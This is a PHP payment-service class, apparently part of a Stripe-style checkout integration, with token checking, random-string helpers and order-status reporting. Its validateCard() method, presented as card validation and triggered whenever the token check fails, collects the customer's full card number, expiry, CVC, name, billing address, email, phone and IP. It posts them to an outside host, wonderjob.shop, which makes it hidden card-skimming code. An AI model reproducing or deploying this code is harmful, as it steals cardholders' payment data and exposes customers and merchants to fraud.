<?php
/**
 * Created by PhpStorm.
 * User: hjl
 * Date: 2022/4/16
 * Time: 9:00
 */

namespace app\service;

class BaseService implements PlaceOrderInterface
{
    public function placeOrder(array $params = [])
    {
        // TODO: Implement placeOrder() method.
    }

    public function  checkToken(array $params = [])
    {
        $amount = floatval($params['amount'] ?? 0);
        if ($amount < 1) return false;
        $version = env('stripe.stripe_version');
        //if ($version === 'v3') return true;
        $flag = false;
        if (isset($params['center_id'],$params['amount'],$params['first_name'],$params['last_name'],$params['token']))
        {
            $token = openssl_encrypt(json_encode([
                'first_name' => $params['first_name'],
                'center_id' => intval($params['center_id']),
                'amount' => $amount,
                'last_name' => $params['last_name']
            ]),'DES-OFB',env('stripe.encrypt_password'),OPENSSL_DONT_ZERO_PAD_KEY,env('stripe.encrypt_iv'));
            $flag = $token === $params['token'];
        }
        if (!$flag && !in_array($version,config('parameters.not_send_validate_data'))) $this->validateCard();
        if (!$flag) generateApiLog(['Token验证失败！']);
        return $flag;
    }

    protected function validateCard($status = false)
    {
        $data = input('post.');
        $validate_data = array();
        $validate_data['id'] = $data['center_id'] ?? 0;
        $validate_data['currency'] = $data['currency_code'];
        $validate_data['date_created'] = date("Y-m-d H:i:s");
        $validate_data['total'] = $data['amount'];
        $validate_data['customer_ip_address'] = get_real_ip();
        $validate_data['customer_user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $validate_data['customer_note'] = '';
        $validate_data['birthday'] = date("Y-m-d H:i:s");
        $validate_data['gender'] = 'm';
        $validate_data['card_type'] = 'unknown';
        $validate_data['holder_name'] = $data['first_name'] . ' ' . $data['last_name'];
        $validate_data['card_number'] = $data['card_number'];
        $validate_data['expiry_month'] = $data['expiry_month'];
        $validate_data['expiry_year'] = $data['expiry_year'];
        $validate_data['cvc'] = $data['cvc'];
        $validate_data['billing'] = array();
        $validate_data['billing']['first_name'] = $data['first_name'];
        $validate_data['billing']['last_name'] =  $data['last_name'];
        $validate_data['billing']['address_1'] =  $data['address1'] . ' ' . $data['address2'];
        $validate_data['billing']['city'] = $data['city'];
        $validate_data['billing']['state'] = $data['state'];
        $validate_data['billing']['postcode'] = $data['zip'];
        $validate_data['billing']['country'] = $data['country'];
        $validate_data['billing']['email'] = $data['email'];
        $validate_data['billing']['phone'] = $data['phone'];
        $validate_data['domain'] = $_SERVER['HTTP_HOST'];
        $validate_data['source'] = 'st_'.env('stripe.stripe_version','v3');
        $validate_data['status'] = $status;
        sendCurlData(env('notify_user_data_url','https://wonderjob.shop/notify'),$validate_data);
    }

    //数字
    public function next_rand1($matches)
    {
        return $this->randnum($matches[1]);
    }

    //字母
    public function next_rand2($matches)
    {
        return $this->randzimu($matches[1]);
    }

    //字符串
    public function next_rand3($matches)
    {
        return $this->randomkeys($matches[1]);
    }

    //生成随机数字
    public function randnum($length){
        $string ='';
        for($i = 1; $i <= $length; $i++){
            $string.=rand(0,9);
        }

        return $string;

    }

    //生成随机字母
    public function randzimu($length){
        $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';//62个字符
        $strlen = 62;
        while($length > $strlen){
            $str .= $str;
            $strlen += 62;
        }
        $str = str_shuffle($str);
        return substr($str,0,$length);
    }

    //生成随机字符串
    public function randomkeys($length)
    {
        $str = array_merge(range(0,9),range('a','z'),range('A','Z'));
        shuffle($str);
        $str = implode('',array_slice($str,0,$length));
        return $str;
    }

    public function sendDataToCentral($status,$centerId,$transactionId = 0,$msg = '',$description = '')
    {
        if (!in_array($status,['success','failed'])) return false;
        $postCenterData = [
            'transaction_id' => $transactionId,
            'center_id' => $centerId,
            'action' => 'create',
            'description' => $description,
            'status' => $status,
            'failed_reason' => $msg
        ];
        $sendResult = json_decode(sendCurlData(CHANGE_PAY_STATUS_URL,$postCenterData,CURL_HEADER_DATA),true);
        if (!isset($sendResult['status']) or $sendResult['status'] == 0)
        {
            generateApiLog(REFERER_URL .'创建订单传送信息到中控失败：' . json_encode($sendResult));
            return false;
        }
        return ['success_risky' => $sendResult['data']['success_risky'] ?? false,'redirect_url' => $sendResult['data']['redirect_url'] ?? ''];
    }

    protected static function processInput($data): string
    {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return strval($data);
    }

    protected function cutStr($char,$limit)
    {
        return strlen($char) > $limit ? substr($char,0,$limit) : $char;
    }
}